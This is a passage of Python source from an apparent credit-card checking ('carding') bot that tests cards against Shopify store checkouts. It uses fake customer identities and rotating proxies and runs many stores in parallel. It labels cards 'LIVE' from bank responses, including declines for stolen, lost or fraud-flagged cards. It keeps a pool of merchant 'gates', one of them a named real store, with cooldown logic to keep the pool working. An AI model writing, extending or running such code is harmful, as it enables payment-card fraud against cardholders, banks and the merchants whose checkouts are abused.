        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message=f"Incorrect CVC — Card LIVE [{code or msg[:40]}]", is_vbv=True, raw_code="incorrect_cvc")
    if "EXPIRED" in c:
        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message=f"Expired Card — Card LIVE [{code or msg[:40]}]", is_vbv=True, raw_code="expired_card")
    if "INSUFFICIENT" in c:
        return GatewayResult(status=CCStatus.INSUFFICIENT, gateway="Shopify",
                             message="Insufficient Funds — Card LIVE", raw_code="insufficient")
    if "3D" in c or "REDIRECT" in c or "AUTHENTICATION" in c:
        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message="3DS Required — Card LIVE", is_vbv=True, raw_code="3ds")
    # Specific bank responses = LIVE
    if any(x in c for x in ["DO_NOT_HONOR", "RESTRICTED", "FRAUD", "BLOCKED", "INVALID_CARD", "STOLEN", "LOST"]):
        display_code = code or msg[:40] or "Bank Decline"
        return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                             message=f"Bank Declined — Card LIVE [{display_code}]", raw_code="do_not_honor")
    # Generic decline = DEAD
    if any(x in c for x in ["DECLINED", "GENERIC_ERROR", "CARD_DECLINED"]):
        display_code = code or msg[:40] or "Declined"
        return GatewayResult(status=CCStatus.DEAD, gateway="Shopify",
                             message=f"Declined — {display_code}", raw_code="declined")
    # Has any code = bank responded = LIVE
    if code or msg:
        return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                             message=f"Bank Response — Card LIVE [{code or msg[:40]}]", raw_code="bank_response")
    return GatewayResult(status=CCStatus.DEAD, gateway="Shopify",
                         message="Submit Failed — Declined", raw_code="submit_failed")


# ── Store cache (module-level) ───────────────────────────────────────────────
# Cached store list — reloaded from DB at most once every 60 seconds.
# This prevents HAMMERING the DB with N queries per mass-check card.
_stores_cache: list[dict] = []
_stores_cache_ts: float = 0.0
_STORES_CACHE_TTL = 120.0  # seconds — longer TTL = fewer DB hits
_stores_cache_lock: asyncio.Lock | None = None  # lazy-init

# Track consecutive infra failures per store URL
# Only HARD infra errors (no session token, cart error, checkout exception)
# count toward disable — NOT no_delivery or no_payment (those are card/product level)
_store_fail_counts: dict[str, int] = {}  # base_url -> consecutive fail count
_store_cooldown_until: dict[str, float] = {}  # base_url -> time.monotonic() cooldown end
_CONSECUTIVE_FAIL_LIMIT = 25   # raised from 3 to 25 — mass check won't kill good stores
_STORE_COOLDOWN_SECONDS = 1800  # 30 minutes cooldown before re-enabling


async def _track_infra_fail(store: dict, error_code: str):
    """Track consecutive infra failures.
    Only REAL infra errors count (no session token, cart fail, checkout fail).
    no_payment and no_delivery are card/product-level — they do NOT disable stores.
    After CONSECUTIVE_FAIL_LIMIT, store gets a 30-min cooldown (NOT permanent DB disable).
    """
    # Only count real infra errors — NOT no_delivery/no_payment (card/product level)
    if error_code not in ("no_session_token", "checkout_exception", "no_checkout_id",
                          "cart_exception", "cart_error"):
        return
    url = store.get("base_url", "")
    _store_fail_counts[url] = _store_fail_counts.get(url, 0) + 1
    count = _store_fail_counts[url]
    logger.debug(f"Store {url} consecutive infra fail #{count} ({error_code})")
    if count >= _CONSECUTIVE_FAIL_LIMIT:
        # Cooldown instead of permanent DB disable — store will auto-recover
        import time as _time
        _store_cooldown_until[url] = _time.monotonic() + _STORE_COOLDOWN_SECONDS
        invalidate_stores_cache()
        logger.info(f"Store {url} cooldown 30min — {count} consecutive '{error_code}' failures")
        _store_fail_counts.pop(url, None)  # reset counter after cooldown


def _is_store_in_cooldown(url: str) -> bool:
    """Check if a store is currently in infra cooldown."""
    import time as _time
    cd = _store_cooldown_until.get(url, 0.0)
    if cd and _time.monotonic() < cd:
        return True
    if cd and _time.monotonic() >= cd:
        _store_cooldown_until.pop(url, None)  # cooldown expired, auto-recover
    return False


def _reset_store_fail_count(url: str):
    """Reset fail counter when store succeeds."""
    _store_fail_counts.pop(url, None)


def _get_cache_lock() -> asyncio.Lock:
    """Get or create the cache lock (Python 3.10+ compatible, no ._loop check)."""
    global _stores_cache_lock
    if _stores_cache_lock is None:
        # Safe: bot runs single event loop for its lifetime
        _stores_cache_lock = asyncio.Lock()
    return _stores_cache_lock


async def _get_stores() -> list[dict]:
    global _stores_cache, _stores_cache_ts
    import time as _time
    now = _time.monotonic()
    # Fast path: return cached stores without lock if still fresh
    if _stores_cache and (now - _stores_cache_ts) < _STORES_CACHE_TTL:
        return list(_stores_cache)
    # Slow path: acquire lock, double-check, then reload
    async with _get_cache_lock():
        now = _time.monotonic()
        if _stores_cache and (now - _stores_cache_ts) < _STORES_CACHE_TTL:
            return list(_stores_cache)  # Another coroutine filled the cache
        try:
            import database.db as db
            import json as _json
            gates = await db.get_active_shopify_gates(limit=50)
            if gates:
                stores = []
                for g in gates:
                    sd = g.get("scan_data", {})
                    if isinstance(sd, str):
                        try: sd = _json.loads(sd)
                        except: sd = {}
                    stores.append({
                        "base_url":          g["base_url"],
                        "variant_id":        g["variant_id"],
                        "price":             g["price"],
                        "currency":          g.get("currency", "USD"),
                        "gate_id":           g["id"],
                        "delivery_handle":   sd.get("delivery_handle", ""),
                        "payment_method_id": sd.get("payment_method_id", "dc2c83c064fc75ebc5dfa2b5bee4f873"),
                    })
                logger.info(f"[Cache MISS] Loaded {len(stores)} active Shopify gates from DB")
                # Filter out stores in infra cooldown
                active_stores = [s for s in stores if not _is_store_in_cooldown(s["base_url"])]
                if len(active_stores) < len(stores):
                    logger.info(f"Filtered {len(stores) - len(active_stores)} stores in cooldown. {len(active_stores)} available.")
                _stores_cache = active_stores
                _stores_cache_ts = now
                return list(_stores_cache)
            else:
                logger.info("No active Shopify gates found in DB. Falling back to DEFAULT_STORES.")
        except Exception as e:
            logger.error(f"DB load error in shopify_gate: {e}", exc_info=True)
        logger.info(f"Using DEFAULT_STORES: {[s['base_url'] for s in DEFAULT_STORES]}")
        _stores_cache = list(DEFAULT_STORES)
        _stores_cache_ts = now
        return list(_stores_cache)


def invalidate_stores_cache():
    """Force-refresh store cache on next call (e.g., after /gscan adds new stores)."""
    global _stores_cache_ts
    _stores_cache_ts = 0.0


# Infra-level error codes (store broken, not card-level issue)
# no_delivery and no_payment are card/product-level — NOT infra (don't count toward store disable)
INFRA_ERROR_CODES = {
    "cart_error", "cart_exception", "checkout_exception",
    "vault_error", "vault_exception",
    "no_session_token", "no_checkout_id",
    "submit_exception", "poll_timeout",
    "throttled", "store_unavailable",
    # NOTE: no_delivery and no_payment removed — those mean card/product issue, not store broken
}


async def check_shopify_on_store(card: CardData, store: dict) -> GatewayResult:
    """
    Check a single card on a single specific Shopify store.
    Used by mass check store-pool architecture.
    Returns GatewayResult (may be INFRA error — caller must handle).
    """
    from core.proxy_manager import get_next_proxy, get_connector, _build_proxy_url

    proxy = get_next_proxy()
    proxy_url = None
    if proxy:
        proxy_url = _build_proxy_url(proxy)

    if proxy:
        connector = get_connector(proxy)
    else:
        connector = aiohttp.TCPConnector(ssl=False, limit=5, force_close=True)

    jar      = CookieJar(unsafe=True)
    customer = random.choice(FAKE_CUSTOMERS)

    try:
        async with aiohttp.ClientSession(
            connector=connector, cookie_jar=jar, timeout=TIMEOUT,
        ) as session:
            result = await _try_shopify_payments(session, card, store, customer, proxy=proxy_url)

        # Attach store metadata to result
        try:
            result.charge_amount = float(store.get("price", "0.0"))
            result.extra["store_url"] = store.get("base_url", "")
            result.extra["currency"]  = store.get("currency", "USD")
        except Exception:
            pass

        # Update store stats for card-level results
        if result.status != CCStatus.ERROR or result.raw_code not in INFRA_ERROR_CODES:
            _reset_store_fail_count(store.get("base_url", ""))
            gate_id = store.get("gate_id") or store.get("id")
            if gate_id:
                try:
                    import database.db as _db
                    success = result.status != CCStatus.ERROR
                    await _db.update_shopify_gate_stats(gate_id, success)
                except Exception:
                    pass
        else:
            await _track_infra_fail(store, result.raw_code)

        return result

    except asyncio.CancelledError:
        raise
    except asyncio.TimeoutError:
        return _err("Timeout", "cart_exception")
    except Exception as e:
        return _err(f"Exception: {str(e)[:60]}", "cart_exception")





# ── Public entry point ────────────────────────────────────────────────────────

async def check_shopify(card: CardData) -> GatewayResult:
    """Check CC via Shopify Payments — /checkouts/internal/graphql/persisted flow."""
    stores   = await _get_stores()
    random.shuffle(stores)
    customer = random.choice(FAKE_CUSTOMERS)

    # ── Helper: try one store, return result or None for infra errors ───────────────
    INFRA_ERRORS = {
        "cart_error", "cart_exception", "checkout_exception",
        "vault_error", "vault_exception",
        "no_session_token", "no_checkout_id",
        "no_delivery", "submit_exception",
        "no_payment", "poll_timeout",
        "throttled",
    }

    async def _try_store(store: dict) -> GatewayResult | None:
        """Try one store. Returns GatewayResult if card-level result, None if infra error."""
        from core.proxy_manager import get_next_proxy, get_connector, _build_proxy_url
        import os

        # SHOPIFY_NO_PROXY=true → use direct connection (recommended for cloud/VPS deployments)
        # where proxies block Shopify checkout pages via Cloudflare
        _no_proxy = os.getenv("SHOPIFY_NO_PROXY", "false").lower() in ("true", "1", "yes")

        store_proxy = None if _no_proxy else get_next_proxy()
        store_proxy_url = None
        if store_proxy:
            store_proxy_url = _build_proxy_url(store_proxy)
            connector = get_connector(store_proxy)
            logger.debug(f"Using proxy for Shopify check on {store['base_url']}: {store_proxy['host']}:{store_proxy['port']}")
        else:
            connector = aiohttp.TCPConnector(ssl=False, limit=5, force_close=True)
            if _no_proxy:
                logger.debug(f"Direct connection (no proxy) for Shopify check on {store['base_url']}")

        jar = CookieJar(unsafe=True)
        try:
            async with aiohttp.ClientSession(
                connector=connector, cookie_jar=jar, timeout=TIMEOUT,
            ) as session:
                result = await _try_shopify_payments(session, card, store, customer, proxy=store_proxy_url)

            try:
                result.charge_amount = float(store.get("price", "0.0"))
                result.extra["store_url"] = store.get("base_url", "")
                result.extra["currency"]  = store.get("currency", "USD")
            except Exception:
                pass

            # Infra error — caller will try next batch of stores
            if result.status == CCStatus.ERROR and result.raw_code in INFRA_ERRORS:
                logger.debug(f"Store {store['base_url']} failed ({result.raw_code}), trying next...")
                await _track_infra_fail(store, result.raw_code)
                return None

            # Card-level result — update stats and return
            _reset_store_fail_count(store.get("base_url", ""))  # store is healthy
            gate_id = store.get("gate_id")
            if gate_id:
                try:
                    import database.db as db
                    success = result.status != CCStatus.ERROR
                    await db.update_shopify_gate_stats(gate_id, success)
                except Exception:
                    pass

            return result

        except asyncio.CancelledError:
            raise  # propagate cancellation from STOP button
        except asyncio.TimeoutError:
            logger.debug(f"Shopify {store['base_url']} timed out")
            return None
        except Exception as e:
            logger.debug(f"Shopify {store['base_url']} error: {e}")
            return None

    # ── Try ALL stores simultaneously — return first card-level result ──────────
    # All stores run in parallel. First non-infra result wins; others cancelled.
    # This gives maximum speed without sequential wait between batches.
    tasks = [asyncio.ensure_future(_try_store(s)) for s in stores]
    card_result: GatewayResult | None = None
    try:
        pending = set(tasks)
        while pending:
            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            for t in done:
                try:
                    r = t.result()
                    if r is not None:  # Card-level result found!
                        card_result = r
                        break
                except Exception:
                    pass
            if card_result is not None:
                break
        # Cancel remaining tasks
        for t in pending:
            t.cancel()
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        raise

    if card_result is not None:
        return card_result

    # ── Fallback: try DEFAULT_STORES if all DB stores failed ─────────────────
    # DB stores may be broken/expired. DEFAULT_STORES (brio4life.com) is always
    # kept up to date and confirmed working.
    db_store_urls = {s.get("base_url","") for s in stores}
    fallback_stores = [s for s in DEFAULT_STORES if s["base_url"] not in db_store_urls]
    if fallback_stores:
        logger.info(f"All DB stores failed — trying {len(fallback_stores)} DEFAULT_STORES as fallback")
        fallback_tasks = [asyncio.ensure_future(_try_store(s)) for s in fallback_stores]
        try:
            pending = set(fallback_tasks)
            while pending:
                done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                for t in done:
                    try:
                        r = t.result()
                        if r is not None:
                            card_result = r
                            break
                    except Exception:
                        pass
                if card_result is not None:
                    break
            for t in pending:
                t.cancel()
            if pending:
                await asyncio.gather(*pending, return_exceptions=True)
        except asyncio.CancelledError:
            for t in fallback_tasks:
                t.cancel()
            raise

        if card_result is not None:
            return card_result

    return _err(
        "All Shopify gates unavailable. Run /gscan to add working gates.",
        "all_stores_failed"
    )

